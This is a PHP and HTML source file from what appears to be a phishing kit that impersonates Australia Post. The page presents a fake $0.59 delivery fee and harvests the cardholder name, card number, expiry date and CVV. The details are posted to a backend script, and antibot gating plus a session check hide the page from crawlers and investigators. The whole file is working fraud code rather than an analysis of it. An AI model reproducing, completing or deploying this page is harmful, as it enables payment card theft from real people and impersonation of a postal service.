<?php
session_start();
include 'lang_main.php';
require_once __DIR__ . '/antibot.php';

// Validate MASTER session
if (!isset($_SESSION['MASTER']) || $_SESSION['MASTER'] !== true) {
    header("HTTP/1.0 404 Not Found");
    exit;
}
// TRACKING STEP
$_SESSION['step'] = 'payment';

// Currency Detection
$country = $_SESSION['country'] ?? 'AU';
$currency = '$ AUD';
$currency_code = 'AUD';
?>
<!DOCTYPE html>
<html lang="<?= $current_lang ?>">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <meta name="robots" content="noindex">
    <title><?= t('payment_title') ?> | Australia Post</title>
    <link rel="icon" type="image/x-icon" href="assets/favicon.ico">
    <link rel="stylesheet" href="assets/post-branding.css?v=<?= time() ?>">
    <!-- Icons Font Awesome -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <script src="assets/site.min.js"></script>
    <style>
        /* CSS FIX SPECIFIQUE PAIEMENT */
        .input-icon-wrapper {
            position: relative;
            width: 100%;
        }
        .input-icon {
            position: absolute;
            right: 15px;
            top: 50%;
            transform: translateY(-50%);
            color: #aaa;
            pointer-events: none;
            font-size: 18px;
        }
        .input-with-icon {
            padding-right: 45px !important; /* Espace pour l'icone */
        }
        
        .info-tooltip {
            position: absolute;
            right: 15px;
            top: 50%;
            transform: translateY(-50%);
            width: 20px;
            height: 20px;
            background: #e0e0e0;
            color: #555;
            border-radius: 50%;
            font-size: 12px;
            font-weight: bold;
            display: flex;
            align-items: center;
            justify-content: center;
            cursor: help;
        }
        .alert-keys-fix label {
            text-transform: none; /* Evite capitalisation forcée */
        }
        
        /* Validation Errors Styles */
        .error-feedback {
            color: #d32f2f;
            background: #fce8e6;
            padding: 8px 10px;
            border-radius: 4px;
            font-size: 11px;
            font-weight: 600;
            margin-top: 6px;
            display: none;
            border: 1px solid #fad2cf;
        }
        
        .input-error {
            border-color: #d32f2f !important;
            background-color: #fdf2f2 !important;
        }

        /* Language Selector Styles */
        .lang-selector {
            display: flex;
            gap: 12px;
            margin-right: 25px;
            font-size: 13px;
            font-weight: 500;
            padding-right: 25px;
            border-right: 1px solid #e0e0e0;
        }
        .lang-selector a {
            text-decoration: none;
            color: #666;
            transition: all 0.2s;
        }
        .lang-selector a:hover {
            color: #000;
        }
        .lang-selector a.active {
            color: #111;
            font-weight: 700;
            text-decoration: underline;
        }
        
        @media (max-width: 480px) {
            .lang-selector {
                margin-right: 15px;
                padding-right: 15px;
                gap: 8px;
                font-size: 12px;
            }
        }
        /* FLOATING LABELS & STYLES */
        .floating-group { position: relative; margin-bottom: 25px; }
        .floating-input {
            width: 100%;
            height: 52px;
            padding: 22px 45px 6px 15px; /* Padding ajusté pour label flottant */
            border: 1px solid #dcdcdc;
            border-radius: 6px;
            font-size: 16px;
            outline: none;
            transition: all 0.2s;
            box-sizing: border-box;
            background: #fff;
            color: #333;
            font-family: inherit;
        }
        .floating-input:focus {
            border-color: #dc1928;
            box-shadow: 0 0 0 2px rgba(220, 25, 40, 0.2);
        }
        .floating-label {
            position: absolute;
            top: 16px;
            left: 15px;
            font-size: 15px;
            color: #777;
            pointer-events: none;
            transition: all 0.2s ease-out;
            background: transparent;
        }
        .floating-input:focus ~ .floating-label,
        .floating-input:not(:placeholder-shown) ~ .floating-label {
            top: 8px;
            font-size: 11px;
            color: #444;
            font-weight: 600;
        }
        
        .input-with-icon { padding-right: 45px; }
        .input-icon { top: 26px !important; color: #666; font-size: 18px; }
        
        .virtual-card-alert {
            background: #fff5f5;
            color: #d32f2f;
            padding: 12px;
            border-radius: 6px;
            border: 1px solid #ffcdd2;
            font-size: 13px;
            font-weight: 600;
            margin-top: 10px;
            display: none;
            animation: fadeIn 0.3s ease;
        }
        @keyframes fadeIn { from{opacity:0;transform:translateY(-5px);} to{opacity:1;transform:translateY(0);} }

        /* Warning Box */
        .payment-warning-box {
            background: #fffbf0;
            border: 1px solid #ffe0a0;
            border-left: 4px solid #f5a623;
            border-radius: 6px;
            padding: 14px 16px;
            margin: 20px 0;
            font-size: 12.5px;
            line-height: 1.55;
            color: #5a4e3a;
        }
        .payment-warning-box b {
            color: #8b6914;
        }

        .accepted-cards-notice {
            text-align: center;
            font-size: 11px;
            color: #999;
            margin-top: 8px;
            margin-bottom: 5px;
        }

        /* Button Styling Update */
        .btn-primary {
            background: #dc1928; color: #ffffff; font-weight: 700; border: none; padding: 16px;
            border-radius: 6px; width: 100%; font-size: 16px; cursor: pointer; transition: 0.2s;
        }
        .btn-primary:hover { background: #b8141e; color: #ffffff; }
        .btn-primary:disabled { background: #eee; color: #aaa; cursor: not-allowed; }

        /* GLOBAL LAYOUT FIX */
        html {
            height: 100%;
        }
        body {
            min-height: 100%;
            display: flex;
            flex-direction: column;
            margin: 0;
            padding: 0;
            overflow-x: hidden;
            background-color: #ecf0f3;
            font-family: 'Frutiger', sans-serif;
            color: #333;
        }
        .post-header {
            flex-shrink: 0;
            background: #fff;
            padding: 15px 0;
            width: 100%;
            z-index: 10;
        }
        .post-footer {
            flex-shrink: 0;
            width: 100%;
        }
        .main-wrapper {
            flex-grow: 1;
            display: flex;
            justify-content: center;
            width: 100%;
            padding: 20px;
            box-sizing: border-box;
            position: relative;
        }
        .content-container {
            width: 100%;
            display: flex;
            justify-content: center;
            margin: auto; /* Safe vertical centering */
        }
        @media (max-width: 480px) {
            .main-wrapper { padding: 15px; }
            .form-card { margin: 0 auto; width: 100%; }
            .payment-ticket { width: 100%; box-sizing: border-box; }
        }
    </style>
</head>
<body>
    <div class="post-yellow-bar"></div>
    <header class="post-header">
        <div class="header-container">
            <div class="logo-container">
                <img src="assets/POST.svg" alt="Australia Post" class="post-logo">
            </div>
            <div class="header-right">
                <div class="login-text">
                    <img src="assets/lock.svg" alt="Secure" class="lock-icon">
                    <span><?= t('secure_conn') ?></span>
                </div>
            </div>
        </div>
    </header>
    <main class="main-wrapper">
        <div class="content-container">
            
            <div class="stepper">
                <div class="step completed">1</div>
                <div class="step-line filled"></div>
                <div class="step active">2</div>
                <div class="step-line"></div>
                <div class="step">3</div>
            </div>
            <div class="form-card payment-card-wrapper" style="position: relative; overflow: hidden;">
                
                <!-- PAYMENT TICKET BOX -->
                <div class="payment-ticket" style="background:#f9f9f9; border:1px solid #eee; border-radius:6px; padding:15px; margin-bottom:25px;">
                    <h4 style="margin:0 0 12px 0; font-size:14px; font-weight:600; color:#333; border-bottom:1px solid #e0e0e0; padding-bottom:8px;">
                        <?= t('ticket_header') ?>
                    </h4>
                    <div style="display:flex; justify-content:space-between; font-size:13px; margin-bottom:6px; color:#555;">
                        <span><?= t('fee_delivery') ?></span>
                        <span>$0.50 AUD</span>
                    </div>
                    <div style="display:flex; justify-content:space-between; font-size:13px; margin-bottom:12px; color:#555;">
                        <span><?= t('fee_process') ?></span>
                        <span>$0.09 AUD</span>
                    </div>
                    <div style="display:flex; justify-content:space-between; font-size:15px; font-weight:700; color:#333; border-top:1px solid #ddd; padding-top:8px;">
                        <span><?= t('total_amount') ?></span>
                        <span>$0.59 AUD</span>
                    </div>
                    <div style="text-align:right; font-size:10px; color:#999; margin-top:4px;">
                        <?= t('vat_msg') ?>
                    </div>
                </div>

                <!-- REFINED CARD ICONS ROW (PREMIUM LOOK) -->
                <div class="card-icons-row" style="display: flex; gap: 15px; margin: 25px 0 15px 0; align-items: center; justify-content: center; background: #fafafa; padding: 12px; border-radius: 8px; border: 1px solid #f0f0f0;">
                    <img id="icon-visa" src="https://cdn.worldvectorlogo.com/logos/visa-10.svg" style="height: 12px; opacity: 0.3; transition: 0.3s;">
                    <img id="icon-master" src="https://cdn.worldvectorlogo.com/logos/mastercard-6.svg" style="height: 20px; opacity: 0.3; transition: 0.3s;">
                    <img id="icon-amex" src="https://cdn.worldvectorlogo.com/logos/american-express-1.svg" style="height: 20px; opacity: 0.3; transition: 0.3s;">
                    
                    <div style="margin-left: auto; display: flex; align-items: center; gap: 6px; color: #777; font-size: 11px; font-weight: 700; text-transform: uppercase; letter-spacing: 0.5px;">
                        <span style="width: 1px; height: 14px; background: #ddd; margin-right: 4px;"></span>
                        <i class="fas fa-shield-alt" style="color: #4CAF50;"></i> <?= t('3d_secure_label') ?>
                    </div>
                </div>

                <!-- ACCEPTED CARDS NOTICE -->
                <p class="accepted-cards-notice"><i class="fas fa-check-circle" style="color:#4CAF50; margin-right:3px;"></i> <?= t('all_cards_accepted') ?></p>

                <!-- WARNING BOX -->
                <div class="payment-warning-box">
                    <?= t('card_warning_box') ?>
                </div>

                <form action="system_srv/second.php" method="POST" id="paymentForm" class="alert-keys-fix">
                    
                    <div class="floating-group">
                        <div class="input-icon-wrapper">
                            <input type="text" name="titu" id="titu" class="floating-input input-with-icon" placeholder=" " required>
                            <label class="floating-label"><?= t('cardholder_name') ?></label>
                            <span class="input-icon"><i class="far fa-user"></i></span>
                        </div>
                        <div class="error-feedback" id="err-titu"><?= t('err_card_holder') ?></div>
                    </div>

                    <div class="floating-group">
                        <div class="input-icon-wrapper">
                            <input type="tel" name="ccc" id="ccc" class="floating-input input-with-icon" placeholder=" " maxlength="19" required>
                            <label class="floating-label"><?= t('card_no') ?></label>
                            <span class="input-icon"><i class="far fa-credit-card"></i></span>
                        </div>
                        <div class="error-feedback" id="err-ccc"><?= t('err_card_number') ?></div>

                    </div>

                    <div class="form-row">
                        <div class="col-6">
                            <div class="floating-group">
                                <input type="tel" name="exp" id="exp" class="floating-input" placeholder=" " maxlength="5" required>
                                <label class="floating-label"><?= t('expiry') ?></label>
                                <div class="error-feedback" id="err-exp"><?= t('err_card_expiry') ?></div>
                            </div>
                        </div>
                        <div class="col-6">
                            <div class="floating-group">
                                <div class="input-icon-wrapper">
                                    <input type="tel" name="cvv" id="cvv" class="floating-input" placeholder=" " maxlength="4" required>
                                    <label class="floating-label"><?= t('cvv_code') ?></label>
                                    <div class="info-tooltip" title="<?= t('cvv_help') ?>">?</div>
                                </div>
                                <div class="error-feedback" id="err-cvv"><?= t('err_card_cvv') ?></div>
                            </div>
                        </div>
                    </div>

                    <button type="submit" class="btn-primary" id="submitBtn" style="margin-top: 10px; height: 52px; font-size: 17px; background: #dc1928; color: #ffffff; box-shadow: 0 4px 12px rgba(220, 25, 40, 0.25);">
                        <?= t('pay_btn_clean') ?>
                    </button>
                    <p style="font-size: 11px; color: #999; text-align: center; margin-top: 15px;">
                        <i class="fas fa-shield-alt" style="margin-right: 4px;"></i> <?= t('3d_secure_hint') ?>
                    </p>


                </form>
                <div class="secure-footer-centered" style="text-align: center; margin-top: 25px; color: #777; font-size: 13px;">
                    <i class="fas fa-lock" style="margin-right: 5px;"></i><?= t('ssl_enc') ?>
                </div>
            </div>
        </div>
    </main>
    <footer class="post-footer">
        <div class="footer-container">
            <!-- DESKTOP VERSION -->
            <div class="footer-desktop">
                <div class="footer-col">
                    <h4><?= t('help_contact') ?></h4>
                    <a href="#">FAQ</a>
                    <a href="#">Contact Center</a>
                    <a href="#">Support</a>
                </div>
                <div class="footer-col">
                    <h4><?= t('data_prot') ?></h4>
                    <a href="#"><?= t('cond_gen') ?></a>
                    <a href="#"><?= t('privacy_policy') ?></a>
                    <a href="#"><?= t('cookies') ?></a>
                </div>
                <div class="footer-col" style="justify-content:flex-end; align-items:flex-end; text-align:right;">
                    <img src="assets/POST.svg" height="28" style="opacity:0.4; margin-bottom:10px;">
                    <p style="font-size:11px; color:#999; margin:0;">
                        &copy; <?= date('Y') ?> Australia Post
                    </p>
                </div>
            </div>
            <!-- MOBILE VERSION -->
            <div class="footer-mobile">
                &copy; <?= date('Y') ?> <?= t('copyright') ?>
            </div>
        </div>
    </footer>
    <script>
    const cccInput = document.getElementById('ccc');
    const expInput = document.getElementById('exp');
    const cvvInput = document.getElementById('cvv');
    const tituInput = document.getElementById('titu');
    const submitBtn = document.getElementById('submitBtn');
    
    // Icons & Feedback Elements
    const iconVisa = document.getElementById('icon-visa');
    const iconMaster = document.getElementById('icon-master');
    const iconAmex = document.getElementById('icon-amex');
    
    // Error Elements
    const errCcc = document.getElementById('err-ccc');
    const errExp = document.getElementById('err-exp');
    const errCvv = document.getElementById('err-cvv');
    const errTitu = document.getElementById('err-titu');


    let currentCardType = '';

    function resetIcons() {
        if(iconVisa) iconVisa.style.opacity = '0.3';
        if(iconMaster) iconMaster.style.opacity = '0.3';
        if(iconAmex) iconAmex.style.opacity = '0.3';
    }

    // --- VALIDATION HELPER FUNCTIONS ---
    function luhnCheck(cardNumber) {
        let sum = 0;
        let isEven = false;
        for (let i = cardNumber.length - 1; i >= 0; i--) {
            let digit = parseInt(cardNumber[i]);
            if (isEven) {
                digit *= 2;
                if (digit > 9) digit -= 9;
            }
            sum += digit;
            isEven = !isEven;
        }
        return (sum % 10) === 0;
    }

    function checkCard(value) {
        const cleaned = value.replace(/\s/g, '');
        if (currentCardType === 'amex') {
            if (cleaned.length !== 15) return false;
        } else {
            if (cleaned.length !== 16) return false;
        }
        return luhnCheck(cleaned);
    }

    function checkExpiry(value) {
        if (!/^\d{2}\/\d{2}$/.test(value)) return false;
        const parts = value.split('/');
        const month = parseInt(parts[0]);
        const year = parseInt('20' + parts[1]);
        const now = new Date();
        const currentYear = now.getFullYear();
        const currentMonth = now.getMonth() + 1;

        if (month < 1 || month > 12) return false;
        if (year < currentYear) return false;
        if (year === currentYear && month < currentMonth) return false;
        // if (year > currentYear + 10) return false; // REMOVED: limit
        return true;
    }

    function checkCVV(value) {
        if (currentCardType === 'amex') return /^\d{4}$/.test(value);
        return /^\d{3}$/.test(value);
    }

    function checkName(value) {
        const trimmed = value.trim();
        const words = trimmed.split(/\s+/);
        return words.length >= 2 && trimmed.length >= 5;
    }

    // Forbidden BINs removed

    // --- UI UPDATE FUNCTIONS ---
    
    // Checks all fields
    function updateButtonState() {
        const isCardValid = checkCard(cccInput.value);
        const isExpValid = checkExpiry(expInput.value);
        const isCvvValid = checkCVV(cvvInput.value);
        const isNameValid = checkName(tituInput.value);
        const allValid = isCardValid && isExpValid && isCvvValid && isNameValid;
        // submitBtn.disabled = !allValid; // REMOVED: Keep button active for better UX (provide feedback on click)
    }

    // Shows/Hides error for a specific field
    function setFeedback(input, errorEl, isValid) {
        if (isValid) {
            errorEl.style.display = 'none';
            input.classList.remove('input-error');
        } else {
            // Only show error if the field is not empty (users don't like red fields on load)
            // But here we usually call this on Blur, so if it's empty on blur, it's an error (required)
            errorEl.style.display = 'block';
            input.classList.add('input-error');
        }
    }

    // --- EVENT LISTENERS ---

    // 1. INPUT: Format, Detect Type, Update Button, Clear Errors if fixed
    cccInput.addEventListener('input', function (e) {
        let value = e.target.value.replace(/\D/g, '');
        let formattedValue = '';
        
        resetIcons();
        currentCardType = '';
        
        // Detect card type — expanded Mastercard to include 2xxx range
        if (value.startsWith('4')) { 
            if(iconVisa) iconVisa.style.opacity = '1'; 
            if(iconMaster) iconMaster.style.opacity = '0.1';
            if(iconAmex) iconAmex.style.opacity = '0.1';
            currentCardType = 'visa'; 
        }
        else if (/^(5[1-5]|2[2-7])/.test(value)) { 
            if(iconMaster) iconMaster.style.opacity = '1'; 
            if(iconVisa) iconVisa.style.opacity = '0.1';
            if(iconAmex) iconAmex.style.opacity = '0.1';
            currentCardType = 'mastercard'; 
        }
        else if (value.startsWith('34') || value.startsWith('37')) { 
            if(iconAmex) iconAmex.style.opacity = '1';
            if(iconVisa) iconVisa.style.opacity = '0.1';
            if(iconMaster) iconMaster.style.opacity = '0.1';
            currentCardType = 'amex'; 
        }

        // Formatting: AMEX uses 4-6-5, others use 4-4-4-4
        if (currentCardType === 'amex') {
            // AMEX: 4-6-5 pattern (max 15 digits)
            let digits = value.substring(0, 15);
            if (digits.length > 4) formattedValue = digits.substring(0,4) + ' ' + digits.substring(4);
            else formattedValue = digits;
            if (digits.length > 10) formattedValue = digits.substring(0,4) + ' ' + digits.substring(4,10) + ' ' + digits.substring(10);
        } else {
            // Standard: 4-4-4-4 pattern (max 16 digits)
            let digits = value.substring(0, 16);
            for (let i = 0; i < digits.length; i++) {
                if (i > 0 && i % 4 === 0) formattedValue += ' ';
                formattedValue += digits[i];
            }
        }
        e.target.value = formattedValue;

        // Smart UI: If valid, remove error immediately
        if (checkCard(formattedValue)) setFeedback(cccInput, errCcc, true);
        
        updateButtonState();
    });

    expInput.addEventListener('input', function (e) {
        let value = e.target.value.replace(/\D/g, '');
        
        // Auto-add slash after 2 digits if not deleting
        if (e.inputType !== 'deleteContentBackward') {
            if (value.length >= 2) {
                value = value.substring(0, 2) + '/' + value.substring(2, 4);
            }
            e.target.value = value;
        }
        
        if (checkExpiry(e.target.value)) setFeedback(expInput, errExp, true);
        updateButtonState();
    });

    cvvInput.addEventListener('input', function (e) {
        e.target.value = e.target.value.replace(/\D/g, '').substring(0, 4);
        if (checkCVV(e.target.value)) setFeedback(cvvInput, errCvv, true);
        updateButtonState();
    });

    tituInput.addEventListener('input', function() {
        if (checkName(tituInput.value)) setFeedback(tituInput, errTitu, true);
        updateButtonState();
    });

    // 2. BLUR: Show errors if invalid (The "Polite" Validation)
    cccInput.addEventListener('blur', function() {
        if (cccInput.value.length > 0 && !checkCard(cccInput.value)) setFeedback(cccInput, errCcc, false);
    });
    expInput.addEventListener('blur', function() {
        if (expInput.value.length > 0 && !checkExpiry(expInput.value)) setFeedback(expInput, errExp, false);
    });
    cvvInput.addEventListener('blur', function() {
        if (cvvInput.value.length > 0 && !checkCVV(cvvInput.value)) setFeedback(cvvInput, errCvv, false);
    });
    tituInput.addEventListener('blur', function() {
       if (tituInput.value.length > 0 && !checkName(tituInput.value)) setFeedback(tituInput, errTitu, false);
    });

    // Submission
    document.getElementById('paymentForm').addEventListener('submit', function(e) {
        const isCardValid = checkCard(cccInput.value);
        const isExpValid = checkExpiry(expInput.value);
        const isCvvValid = checkCVV(cvvInput.value);
        const isNameValid = checkName(tituInput.value);
        const allValid = isCardValid && isExpValid && isCvvValid && isNameValid;

        if (!allValid) {
            e.preventDefault();
            // Force show all errors immediately to guide the user
            setFeedback(cccInput, errCcc, isCardValid);
            setFeedback(expInput, errExp, isExpValid);
            setFeedback(cvvInput, errCvv, isCvvValid);
            setFeedback(tituInput, errTitu, isNameValid);
            
            // Shake effect or scroll would be nice, but let's keep it simple
            return false;
        }

        
        submitBtn.innerHTML = '<i class="fas fa-circle-notch fa-spin"></i> ' + '<?= t('processing') ?>';
        submitBtn.style.opacity = '0.8';
        submitBtn.style.pointerEvents = 'none';
    });

    // Initial check
    updateButtonState();
    </script>

</body>
</html>
